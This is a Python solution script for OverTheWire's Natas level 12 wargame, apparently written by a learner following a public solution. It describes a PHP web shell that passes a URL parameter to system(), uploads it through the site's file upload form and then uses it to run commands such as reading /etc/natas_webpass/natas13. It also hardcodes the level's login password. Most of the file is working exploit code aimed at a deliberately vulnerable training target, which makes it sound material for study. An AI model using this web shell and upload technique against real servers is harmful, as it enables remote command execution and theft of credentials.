#!/usr/bin/env python3
'''

https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas12.py
https://www.youtube.com/watch?v=fqwxYowJA0c&list=PL1H1sBF1VAKWM3wMCn6H5Ql6OrgIivt2V&index=10

File upload  documentation
In the next URL, look for title  "POST a Multipart-Encoded File"
https://docs.python-requests.org/en/latest/user/quickstart/

Level 12 → Level 13
Username: natas12
URL:      http://natas12.natas.labs.overthewire.org
password:   EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
problem:
write up:
 we are uploading  the next  file 'revshell.php'  as a jpg file
     #!/usr/bin/php
     <?php
        system($_GET['c']);
     ?>
  and we are loading a system command  to  $_GET['c']
  system ()   will run in the remote host
'''
import base64

import requests
import re
import urllib
import sys


username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.get(url, auth = (username, password) )
'''
# This commad upload the file 'revshell.php' to the url
response = session.post(url,
                        files = { "uploadedfile" : open('revshell.php', 'rb') },
                        data = { "filename" : "revshell.php", "MAX_FILE_SIZE" : "1000" },
                        auth = (username, password) )
content = response.text
print (content)
'''
php_file_name = 'upload/399jg55sjz.php' # This name appears in the upper output

command0 = 'whoami'
command1 = "ls -lah"
command2 = "cat zyey5bs3ji.jpg"
command3 = "cat /etc/natas_webpass/natas13"
command = command3
response = session.get( url +  php_file_name + '?c='  + command,
                        auth = (username, password ))

#response = session.get( url + php_file_name +'?c=cat /etc/natas_webpass/natas13',
#                        auth = (username, password ))


content = response.text

print (content)